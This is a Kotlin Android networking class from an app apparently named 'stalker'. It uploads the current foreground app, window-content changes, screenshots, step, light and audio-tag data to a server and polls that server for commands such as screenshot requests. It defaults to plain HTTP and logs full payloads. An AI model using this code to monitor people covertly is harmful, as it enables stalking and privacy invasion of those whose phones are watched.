package com.askqing.stalker.api

import android.content.Context
import android.util.Log
import com.askqing.stalker.R
import com.askqing.stalker.model.*
import com.askqing.stalker.util.OfflineQueue
import com.askqing.stalker.util.PreferenceManager
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * API 客户端
 * 负责与后端服务器的所有网络通信
 * 包含设备注册、心跳、数据上传、命令轮询等功能
 * 支持离线队列和自动重试
 */
class ApiClient private constructor(context: Context) {

    private val preferenceManager = PreferenceManager(context)
    private val offlineQueue = OfflineQueue(context)
    private val gson: Gson = GsonBuilder().setPrettyPrinting().create()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(10, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)  // 截图上传需要较长超时
            .addInterceptor { chain ->
                val request = chain.request().newBuilder()
                    .addHeader("X-Device-ID", preferenceManager.deviceId)
                    .addHeader("X-Device-Name", preferenceManager.deviceName)
                    .addHeader("Content-Type", "application/json")
                    .build()
                chain.proceed(request)
            }
            .build()
    }

    private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

    companion object {
        private const val TAG = "ApiClient"

        @Volatile
        private var instance: ApiClient? = null

        fun getInstance(context: Context): ApiClient {
            return instance ?: synchronized(this) {
                instance ?: ApiClient(context.applicationContext).also { instance = it }
            }
        }
    }

    // ==================== 设备注册 ====================

    /**
     * 注册设备到服务器
     * @return 注册成功返回 true 和 device_id
     */
    suspend fun registerDevice(): Result<String> = withContext(Dispatchers.IO) {
        try {
            val request = DeviceRegisterRequest(
                deviceName = preferenceManager.deviceName,
                deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
                androidVersion = "Android ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})",
                appVersion = "1.0.0"
            )

            val response = post("/api/device/register", request)
            if (response != null) {
                val registerResponse = gson.fromJson(response, DeviceRegisterResponse::class.java)
                if (registerResponse.success && registerResponse.deviceId != null) {
                    preferenceManager.deviceId = registerResponse.deviceId
                    Log.i(TAG, "设备注册成功: ${registerResponse.deviceId}")
                    Result.success(registerResponse.deviceId)
                } else {
                    Log.w(TAG, "设备注册失败: ${registerResponse.message}")
                    Result.failure(Exception(registerResponse.message ?: "注册失败"))
                }
            } else {
                Result.failure(IOException("服务器无响应"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "设备注册异常", e)
            Result.failure(e)
        }
    }

    // ==================== 心跳 ====================

    /**
     * 发送心跳
     */
    suspend fun sendHeartbeat(): Boolean = withContext(Dispatchers.IO) {
        try {
            val request = HeartbeatRequest(
                deviceId = preferenceManager.deviceId,
                timestamp = System.currentTimeMillis(),
                currentApp = preferenceManager.lastForegroundApp,
                meetingMode = preferenceManager.isMeetingMode
            )

            val response = post("/api/device/heartbeat", request)
            val success = response != null
            if (success) {
                preferenceManager.lastSyncTime = System.currentTimeMillis()
            }
            success
        } catch (e: Exception) {
            Log.e(TAG, "心跳发送失败", e)
            false
        }
    }

    // ==================== 应用事件 ====================

    /**
     * 上报应用切换事件
     */
    suspend fun reportAppSwitch(event: AppSwitchEvent) {
        postOrQueue("/api/events/app-switch", event, "app_switch_${event.timestamp}")
    }

    /**
     * 上报窗口内容变化
     */
    suspend fun reportWindowContentChange(event: WindowContentChangeEvent) {
        postOrQueue("/api/events/window-content", event, "window_${event.timestamp}")
    }

    /**
     * 上报应用切换链
     */
    suspend fun reportAppSwitchChain(chain: AppSwitchChain) {
        postOrQueue("/api/events/app-switch-chain", chain, "chain_${chain.startTime}")
    }

    // ==================== 截图 ====================

    /**
     * 上传截图
     */
    suspend fun uploadScreenshot(screenshot: ScreenshotUploadRequest): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val response = post("/api/screenshot/upload", screenshot)
                response != null
            } catch (e: Exception) {
                Log.e(TAG, "截图上传失败", e)
                false
            }
        }
    }

    // ==================== 传感器数据 ====================

    /**
     * 上传步数数据
     */
    suspend fun uploadSteps(steps: StepCountUpload) {
        postOrQueue("/api/sensor/steps", steps, "steps_${steps.timestamp}")
    }

    /**
     * 上传环境光数据（单条）
     */
    suspend fun uploadLightData(data: LightSensorData) {
        postOrQueue("/api/sensor/light", data, "light_${data.timestamp}")
    }

    /**
     * 上传环境光曲线
     */
    suspend fun uploadLightCurve(curve: LightCurveUpload) {
        postOrQueue("/api/sensor/light-curve", curve, "light_curve_${curve.startTime}")
    }

    // ==================== 音频 ====================

    /**
     * 上传音频标签
     */
    suspend fun uploadAudioTag(tag: AudioTag) {
        postOrQueue("/api/sensor/audio-tag", tag, "audio_${tag.timestamp}")
    }

    // ==================== 分析数据 ====================

    /**
     * 上报操作节奏分析
     */
    suspend fun reportOperationRhythm(analysis: OperationRhythmAnalysis) {
        postOrQueue("/api/analytics/operation-rhythm", analysis, "rhythm_${analysis.timestamp}")
    }

    // ==================== 命令轮询 ====================

    /**
     * 轮询服务器命令（截图请求等）
     */
    suspend fun pollCommands(): ServerCommandResponse? = withContext(Dispatchers.IO) {
        try {
            val url = "${baseUrl()}/api/device/commands?device_id=${preferenceManager.deviceId}"
            val request = Request.Builder()
                .url(url)
                .addHeader("X-Device-ID", preferenceManager.deviceId)
                .get()
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string()
                if (!body.isNullOrEmpty()) {
                    gson.fromJson(body, ServerCommandResponse::class.java)
                } else null
            } else null
        } catch (e: Exception) {
            Log.e(TAG, "命令轮询失败", e)
            null
        }
    }

    // ==================== 测试连接 ====================

    /**
     * 测试服务器连接
     */
    suspend fun testConnection(): Result<String> = withContext(Dispatchers.IO) {
        try {
            val url = "${baseUrl()}/api/health"
            val request = Request.Builder().url(url).get().build()
            val response = client.newCall(request).execute()

            if (response.isSuccessful) {
                val body = response.body?.string()
                Result.success(body ?: "连接成功")
            } else {
                Result.failure(Exception("HTTP ${response.code}: ${response.message}"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }

    // ==================== 离线队列 ====================

    /**
     * 处理离线队列
     */
    suspend fun processOfflineQueue() {
        val entries = offlineQueue.getAll()
        if (entries.isEmpty()) return

        Log.i(TAG, "处理离线队列: ${entries.size} 条")
        var processed = 0

        for (entry in entries) {
            try {
                val request = Request.Builder()
                    .url("${baseUrl()}${entry.endpoint}")
                    .method(entry.method, entry.body.toRequestBody(JSON_MEDIA_TYPE))
                    .build()

                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    offlineQueue.remove(entry.id)
                    processed++
                } else {
                    offlineQueue.incrementRetry(entry.id)
                }
            } catch (e: Exception) {
                offlineQueue.incrementRetry(entry.id)
            }
        }

        if (processed > 0) {
            Log.i(TAG, "离线队列已处理 $processed 条")
            preferenceManager.lastSyncTime = System.currentTimeMillis()
        }
    }

    /**
     * 关闭 API 客户端
     */
    fun shutdown() {
        scope.cancel()
    }

    // ==================== 内部方法 ====================

    private fun baseUrl(): String {
        var url = preferenceManager.serverUrl
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            url = "http://$url"
        }
        return url.trimEnd('/')
    }

    /**
     * POST 请求
     */
    private suspend fun post(endpoint: String, body: Any): String? = withContext(Dispatchers.IO) {
        try {
            val url = "${baseUrl()}$endpoint"
            val json = gson.toJson(body)
            Log.d(TAG, "POST $url -> $json")

            val request = Request.Builder()
                .url(url)
                .post(json.toRequestBody(JSON_MEDIA_TYPE))
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                response.body?.string()
            } else {
                Log.w(TAG, "POST 失败: ${response.code} ${response.message}")
                null
            }
        } catch (e: IOException) {
            Log.w(TAG, "网络错误，将加入离线队列: $endpoint", e)
            null
        }
    }

    /**
     * 发送请求，失败则加入离线队列
     */
    private suspend fun postOrQueue(endpoint: String, body: Any, uniqueId: String) {
        val result = post(endpoint, body)
        if (result == null) {
            // 网络不可用，加入离线队列
            val entry = OfflineQueueEntry(
                id = uniqueId,
                endpoint = endpoint,
                body = gson.toJson(body)
            )
            offlineQueue.add(entry)
            Log.d(TAG, "已加入离线队列: $uniqueId")
        }
    }
}
